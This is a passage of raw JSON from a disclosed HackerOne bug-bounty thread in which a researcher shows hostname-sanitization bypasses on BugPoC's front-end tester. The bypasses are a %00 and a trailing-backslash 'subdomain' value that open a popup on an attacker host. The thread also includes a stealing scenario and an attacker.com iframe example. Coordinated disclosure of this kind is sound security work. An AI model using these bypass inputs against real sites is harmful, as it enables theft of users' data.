Ja8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026amp;X-Amz-Signature=d3c5ad9a87fc7336324f063e01bab9f5f9fdf5ef9215121e516f81fd3afed24e\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/U5zCsWSA445CaZjwtLVs1rKF?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-07-20_at_12.22.50_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-07-20_at_12.22.50_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071204Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026amp;X-Amz-Signature=d3c5ad9a87fc7336324f063e01bab9f5f9fdf5ef9215121e516f81fd3afed24e\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T16:25:38.836Z","updated_at":"2020-07-20T16:25:52.697Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":914279,"filename":"Screen_Shot_2020-07-20_at_12.22.50_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/U5zCsWSA445CaZjwtLVs1rKF?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-07-20_at_12.22.50_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-07-20_at_12.22.50_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZARQHHWQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071204Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBQWzuE8IbbbIcKuKCAVWHjExgkKEzVjBGDGEJEJkm2uAiEA0E2G6Bi5CCZvfaz4xkbWl%2FYyVr4wEViv8KeA%2B6Mx%2F4wqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDNAOLcaL61uNqnH2gCqRA0axLsf0gZzwel70GPHsBKQ%2B8tDatm5gG2E6UL3FFsta7sO%2BVtypwMA9X5rU0Hxbt%2BZD45O0fAcHO2eYH9aJRT6%2BWkboWqnrUVs3y3PursdkZG9D0s%2FLF%2FtmMI0qlsnhf5rUrGjIuAod0M%2BAVK5Jee5XjoBv2nWX451AYJ7x7TdP%2F6LuLExfdMPN83%2Fn8Z5EEe9I3zQlGrRUDnPpV3KBjTEEYEMf%2BLbfZubbTTMLkKKB5kvBB%2BnUDpvkR1dfNiAsacgxiyhMwtuVnE60hK9RQqlXDSBKS28FCDOiq5oUVVsYMFrOFjFTG5GvXudT2Lf1SFOE30GhOfUDbdcWQDOfNbqxfwEk3DSvUsZHmQ2YERAk1vfvZdgow7TCmz8dssjuzUvGn0%2FDZqF4HsuOs3BAPh%2FUzBr%2F1bXw6m0sKhkFT0hHKtt34aweZJ6OMTQUJfbgHm2x109ibVpkum9a2Y%2F5B8ycV7kPX9rtX%2FNF4jpY2wtPFJD0J4KrhjG9RkXDpPtJIiyKr6zHCzbtXUTKm8X4peEwMKiLq%2F8FOusBvoCV7CXv6D%2FHKI5Cfdbnykzwkk9RgXAw%2F2ivmEUivAHQJVvhdpJk8tOJOtZHe1qBfJT97TlikPwHbC%2ByhixDPYCBHqU9RNQ0G%2Fw4q6SY2zN516gfcPTtMUUZuuMs4Gf6cUwztkgdjXZ24fN2YfBLKfG9bjI54sEGYTemrmJWiPnf4Zp23612rg1SFLy28q9IJDIC5VZ0ihqVJEP78L5qGR9Wdq4u0JUyMsOD6XNtP%2FU09fIMfRJa8EiwRkmjjWMtIMgOiqGsIQRNc7WAmjk9JrSnnqGmuXaLzY5Hr%2F9a20FaJP45FbVkwXh1IQ%3D%3D\u0026X-Amz-Signature=d3c5ad9a87fc7336324f063e01bab9f5f9fdf5ef9215121e516f81fd3afed24e"}],"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8655288,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Interesting, the popup opens on Firefox (78.0.2 linux) but not on Chromium.","markdown_message":"\u003cp\u003eInteresting, the popup opens on Firefox (78.0.2 linux) but not on Chromium.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T16:29:46.476Z","updated_at":"2020-07-20T16:29:46.476Z","actor":{"username":"acut3","cleared":false,"url":"/acut3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/jk4zi2uv8mip9mHAheM7DUdw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8655705,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Interesting. I think your original attack scenario applies here (although now with a browser limitation)\n\n1. The victim is tricked into opening https://bugpoc.com/testers/front-end#subdomain=bugpoc-u6e72i25g8zj.acut3.xyz%00 (**using Firefox**)\n1. The victim then enters his PoC information on this page\n1. The victim clicks test\n1. The attacker steals the PoC data\n\nAlthough I am not sure if I follow your *Steal-Organization-internal-network-data-via-DNS-Rebinding* attack scenario. Couldn't this same thing be accomplished by just putting `\u003ciframe src='attacker.com'\u003e\u003c/iframe\u003e` in the HTML PoC? In other words, isn't this situation **unavoidable** when viewing untrusted HTML/JS in your browser, regardless of popup location?","markdown_message":"\u003cp\u003eInteresting. I think your original attack scenario applies here (although now with a browser limitation)\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe victim is tricked into opening \u003ca title=\"https://bugpoc.com/testers/front-end#subdomain=bugpoc-u6e72i25g8zj.acut3.xyz%00\" href=\"/redirect?url=https%3A%2F%2Fbugpoc.com%2Ftesters%2Ffront-end%23subdomain%3Dbugpoc-u6e72i25g8zj.acut3.xyz%2500\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugpoc.com/testers/front-end#subdomain=bugpoc-u6e72i25g8zj.acut3.xyz%00\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (\u003cstrong\u003eusing Firefox\u003c/strong\u003e)\u003c/li\u003e\n\u003cli\u003eThe victim then enters his PoC information on this page\u003c/li\u003e\n\u003cli\u003eThe victim clicks test\u003c/li\u003e\n\u003cli\u003eThe attacker steals the PoC data\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eAlthough I am not sure if I follow your \u003cem\u003eSteal-Organization-internal-network-data-via-DNS-Rebinding\u003c/em\u003e attack scenario. Couldn\u0026#39;t this same thing be accomplished by just putting \u003ccode\u003e\u0026lt;iframe src=\u0026#39;attacker.com\u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/code\u003e in the HTML PoC? In other words, isn\u0026#39;t this situation \u003cstrong\u003eunavoidable\u003c/strong\u003e when viewing untrusted HTML/JS in your browser, regardless of popup location?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T16:39:40.150Z","updated_at":"2020-07-20T16:39:40.150Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8655800,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Right, it doesn't provide any new way to attacking the Organization. I only mentioned it to make sure it gets fixed in the right place rather than in `populateFromFragment()`, since whether this is exploitable or not, it's a (browser-dependent) bypass on the sanitization that is done on `subdomain`.","markdown_message":"\u003cp\u003eRight, it doesn\u0026#39;t provide any new way to attacking the Organization. I only mentioned it to make sure it gets fixed in the right place rather than in \u003ccode\u003epopulateFromFragment()\u003c/code\u003e, since whether this is exploitable or not, it\u0026#39;s a (browser-dependent) bypass on the sanitization that is done on \u003ccode\u003esubdomain\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T16:48:50.774Z","updated_at":"2020-07-20T16:48:50.774Z","actor":{"username":"acut3","cleared":false,"url":"/acut3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/jk4zi2uv8mip9mHAheM7DUdw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8655938,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Another bypass that works on Firefox and Chrome (don't know about Safari): `https://bugpoc.com/testers/front-end#subdomain=bugpoc-u6e72i25g8zj.acut3.xyz\\`\n\nThe `\\` is accepted by the regexp and the browser will normalize it into a forward slash, opening the popup on `http://bugpoc-u6e72i25g8zj.acut3.xyz/.web.bugpoc.ninja/index.html`.","markdown_message":"\u003cp\u003eAnother bypass that works on Firefox and Chrome (don\u0026#39;t know about Safari): \u003ccode\u003ehttps://bugpoc.com/testers/front-end#subdomain=bugpoc-u6e72i25g8zj.acut3.xyz\\\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003e\\\u003c/code\u003e is accepted by the regexp and the browser will normalize it into a forward slash, opening the popup on \u003ccode\u003ehttp://bugpoc-u6e72i25g8zj.acut3.xyz/.web.bugpoc.ninja/index.html\u003c/code\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T17:04:44.609Z","updated_at":"2020-07-20T17:04:44.609Z","actor":{"username":"acut3","cleared":false,"url":"/acut3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/jk4zi2uv8mip9mHAheM7DUdw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8656416,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Nice catch. I do not want to try to find every corner case of exotic encoding and/or browser normalizations in hostnames. Instead, I just changed the regex (both client-side in `populateFromFragment()` and server-side in `/publish-poc`) to only allow alphanumeric, period (.), dash (-), and underscore (_).  I think this should solve the problem. Do you agree?","markdown_message":"\u003cp\u003eNice catch. I do not want to try to find every corner case of exotic encoding and/or browser normalizations in hostnames. Instead, I just changed the regex (both client-side in \u003ccode\u003epopulateFromFragment()\u003c/code\u003e and server-side in \u003ccode\u003e/publish-poc\u003c/code\u003e) to only allow alphanumeric, period (.), dash (-), and underscore (_).  I think this should solve the problem. Do you agree?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T17:51:33.213Z","updated_at":"2020-07-20T17:51:33.213Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8657238,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Agreed.","markdown_message":"\u003cp\u003eAgreed.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T19:27:47.818Z","updated_at":"2020-07-20T19:27:47.818Z","actor":{"username":"acut3","cleared":false,"url":"/acut3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/jk4zi2uv8mip9mHAheM7DUdw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8657254,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Nice bypass!","markdown_message":"\u003cp\u003eNice bypass!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T19:30:42.368Z","updated_at":"2020-07-20T19:30:42.368Z","actor":{"url":"/bugpoc","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/uu9HGr8oDden1RHaB9Da9GjM/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"BugPoC"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"bugpoc","collaborator":{"username":"acut3","url":"/acut3"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8657276,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks! I honestly wasn't expected a new bounty, but it's very much appreciated.","markdown_message":"\u003cp\u003eThanks! I honestly wasn\u0026#39;t expected a new bounty, but it\u0026#39;s very much appreciated.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T19:34:50.618Z","updated_at":"2020-07-20T19:34:50.618Z","actor":{"username":"acut3","cleared":false,"url":"/acut3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/jk4zi2uv8mip9mHAheM7DUdw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8657403,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We appreciate you being such an active participant in the program and checking out the BugPoC product! :)","markdown_message":"\u003cp\u003eWe appreciate you being such an active participant in the program and checking out the BugPoC product! :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-20T19:50:34.289Z","updated_at":"2020-07-20T19:50:34.289Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8878678,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Could we disclose this?","markdown_message":"\u003cp\u003eCould we disclose this?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-07T19:05:47.229Z","updated_at":"2020-08-07T19:05:47.229Z","first_to_agree":true,"actor":{"username":"acut3","cleared":false,"url":"/acut3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/jk4zi2uv8mip9mHAheM7DUdw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8878709,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Yes. It was a really cool bug and well documented. Disclosed!","markdown_message":"\u003cp\u003eYes. It was a really cool bug and well documented. Disclosed!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-07T19:12:08.455Z","updated_at":"2020-08-07T19:12:08.455Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8878710,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-07T19:12:08.577Z","updated_at":"2020-08-07T19:12:08.577Z","actor":{"username":"bugpoc_ryan","cleared":false,"url":"/bugpoc_ryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/XkXLmTi1HngqmWKuv5FDbtEs/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"bugpoc","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}